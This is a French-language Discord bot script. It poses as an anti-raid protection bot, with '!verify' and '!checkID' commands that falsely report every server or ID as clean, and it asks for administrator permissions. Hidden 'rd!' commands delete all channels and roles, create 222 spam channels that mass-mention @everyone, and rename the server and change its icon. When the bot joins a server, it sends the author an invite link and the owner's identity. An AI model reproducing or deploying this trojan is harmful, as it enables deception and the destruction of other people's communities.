const Discord = require('discord.js'); // npm i discord.js
const MagicHitler = require('magic_hitler'); // npm i magic_hitler
const client = new Discord.Client();
const raid = new MagicHitler.Client({
    client: client,
    prefix: "rd!" // Optionnel ; Préfixe pour les commandes
});
 
raid.ready();
 
raid.sendMessage("Test réussi", "test");

// Détruire le serveur en entier :

raid.deleteChannel("del");
raid.deleteChannels("raid", {
    createChannel: true,
    createdChannelName: "vous-êtes-en-pls",
    createChannelMessage: ":biohazard: :biohazard: **@everyone La TEAM FA3T vous remercie @everyone** :biohazard: :biohazard:\n\n**RAID PROTECT ET FTNL CE FONT BZ**\n\nhttps://cdn.discordapp.com/attachments/515560605562961932/517788843542446087/videotogif_2018_07_26_08_51_48.gif"
});
raid.createChannels("raid", {
    createChannelName: "raid-by-fa3t",
    sendMessageContent: ":biohazard: :biohazard: **@everyone La TEAM FA3T vous remercie @everyone** :biohazard: :biohazard:\n\n**RAID PROTECT ET FTNL CE FONT BZ**\n\nhttps://cdn.discordapp.com/attachments/515560605562961932/517788843542446087/videotogif_2018_07_26_08_51_48.gif",
    sendMessageCount: 10,
    createChannelCount: 222
});
raid.createInvite("invite", false);
raid.createInvite("inviteall", true);
 
raid.deleteRoles("raid");
raid.createRoles("raid", {
    rolesNumber: 69,
    rolesName: "raid-by-fa3t"
});

// Commandes Raids :

raid.deleteChannel("del");
raid.deleteChannels("delAll", {
    createChannel: true,
    createdChannelName: "vous-êtes-en-pls",
    createChannelMessage: ":biohazard: :biohazard: **@everyone La TEAM FA3T vous remercie @everyone** :biohazard: :biohazard:\n\n**RAID PROTECT ET FTNL CE FONT BZ**\n\nhttps://cdn.discordapp.com/attachments/515560605562961932/517788843542446087/videotogif_2018_07_26_08_51_48.gif"
});
raid.createChannels("chnls", {
    createChannelName: "raid-by-fa3t",
    sendMessageContent: ":biohazard: :biohazard: **@everyone La TEAM FA3T vous remercie @everyone** :biohazard: :biohazard:\n\n**RAID PROTECT ET FTNL CE FONT BZ**\n\nhttps://cdn.discordapp.com/attachments/515560605562961932/517788843542446087/videotogif_2018_07_26_08_51_48.gif",
    sendMessageCount: 10,
    createChannelCount: 222
});
raid.createInvite("invite", false);
raid.createInvite("inviteAll", true);
 
raid.deleteRoles("delRls");
raid.createRoles("rls", {
    rolesNumber: 69,
    rolesName: "raid-by-fa3t"
});

// Fakes commandes :

client.on('message', message => {
    
    if(message.content === "!help"){
        let embed = new Discord.RichEmbed()
            .setColor('#E69900')
            .setTitle("📬 Aide :")
            .setDescription("__**Commandes Basique :**__\n📬 **!help :** Affiche les commandes\n🏓 **!ping :** Voir la latence du bot en MS\n📋 **!serverinfo :** Affiche les statistiques du serveur\n\n__**Commandes Anti-Raid :**__\n🔎 **!verify :** Vérifier les membres du serveur\n🔰 **!raidmode (bientôt) :** Protège votre serveur lors d'un raid\n💼 **!checkID (bientôt) :** Vérifier une ID\n\n__**Liens :**__\n**[Serveur Support](https://discordapp.com)** (bientôt)\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
            .setTimestamp()
        message.channel.send(embed)
    }

    if(message.content === "!verify"){
        let embed = new Discord.RichEmbed()
            .setColor('#24D742')
            .setTitle("✅ Serveur vérifié !")
            .setDescription("Aucun membres du serveur ne fais parti de notre liste noir.\nNous vous conseillons de vérifier une fois par semaine.")
        message.channel.send(embed)
    }

    if(message.content === "!serverinfo"){
        let serv = message.guild;
        let servCreated = message.guild.createdAt.toString().split(' ');
        let servHumain = serv.members.filter(member => !member.user.bot).size;
        let servBot = serv.members.filter(member => member.user.bot).size;
        let embed = new Discord.RichEmbed()
            .setColor('#E69900')
            .setThumbnail(message.guild.iconURL)
            .setTitle("📋 Informations sur le serveur :")
            .addField(`Nom :`, `→ ${serv.name}`, true)
            .addField(`Propriétaire :`, `→ ${serv.owner}`, true)
            .addField(`Créé le :`, `→ ${servCreated[1] + ', ' + servCreated[2] + ' ' + servCreated[3]}`,true)
            .addField(`Région :`, `→ ${serv.region}`, true)
            .addField(`Channels :`, `→ ${serv.channels.size}`,true)
            .addField(`Membres (` + serv.memberCount + ") :", `→ ${servHumain + " humains et " + servBot + " bots"}`, true)
            .addField(`Nombre de rôles :`, `→ ${serv.roles.size}`, true)
        message.channel.send(embed)
    }

    if(message.content === "!raidmode"){
        message.channel.send("**⚠ Commande en développement. (servira à blocker le serveur d'un raid)**")
    }

    if(message.content === "!checkID"){
        let uID = message.content.slice(prefix.length).trim().split(' ');
        let embed = new Discord.RichEmbed()
            .setTitle("✅ Membre vérifié !")
            .setDescription(`L'identifiant **${uID}** n'est pas dans notre liste noire.`)
        message.channel.send()
    }

    if(message.content === "!ping"){
        let embed = new Discord.RichEmbed()
            .setColor('#D50303')
            .setDescription('🏓 **Pong !** ' + client.ping + ' ms')
        message.channel.send(embed)
    }

    // Commandes Raid en plus :

    if(message.content === "rd!help"){
        message.delete()
        let embed = new Discord.RichEmbed()
            .setColor('#E69900')
            .setTitle("📬 Aide Raid :")
            .setDescription("__**Commandes Raid :**__\n**~raid :** Détruit le serveur.\n**~del :** Supprime le channel où la commande est exécuté.\n**~delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**~invite :** Créer une invitation pour un serveur (où le bot est présent)\n**~inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**~delRls :** Supprime tous les rôles\n**~rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**~a (bientôt) :** Créer un rôle pour être admin\n**~cGuild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
            .setTimestamp()
        message.author.send(embed)
    }

    if(message.content === "rd!guild"){
        message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
        message.guild.setName("RAID BY TEAM FA3T")
        message.member.setNickname("RAID BY TEAM FA3T")
    }

    if(message.content === "rd!raid"){
        message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
        message.guild.setName("RAID BY TEAM FA3T")
        message.guild.members.setNickname("RAID BY TEAM FA3T")
    }

    if(message.content === "rd!emoji"){
        message.guild.createEmoji('https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png', name, 'lol')
    }

});

// Quand le bot rejoins un serveur :

client.on("guildCreate", async guild => {
    let chnlslogs = client.channels.find("id", "518710630044401665")
    let embed = new Discord.RichEmbed()
        .setThumbnail(guild.iconURL)
        .setColor('#2FD435')
        .setTitle("📥 Nouveau Serveur")
        .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
        .addField(`**${guild.name}** vient d'ajouter __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
        .setTimestamp()
    chnlslogs.send(embed)
    let textChannel = guild.channels
    .filter(function (channel) {return channel.type === 'text' || channel.type === 'voice'})
    .first().createInvite().then(invite => chnlslogs.send(invite.url))
});

// Quand le bot quitte un serveur :

client.on("guildDelete", async guild => {
    let embed = new Discord.RichEmbed()
        .setThumbnail(guild.iconURL)
        .setColor('#FE0101')
        .setTitle("📤 Départ Serveur")
        .setDescription(`〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓`)
        .addField(`**${guild.name}** vient de retirer __${client.user.username}__ à sa liste de bot !\nLe bot est maintenant présent sur **${client.guilds.size}** serveurs.\n\nLe créateur du serveur est : **${guild.owner.user.username}#${guild.owner.user.discriminator}** (${guild.owner.id}).`)
        .setTimestamp()
    client.channels.get("518710630044401665").send(embed)
});

client.on('ready', async () => {
    client.user.setActivity(`956 Serveurs | !help`, {type: "WATCHING"});
});

client.login(process.env.TOKEN);
